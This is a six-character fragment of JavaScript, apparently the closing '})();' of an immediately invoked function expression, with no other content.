})();
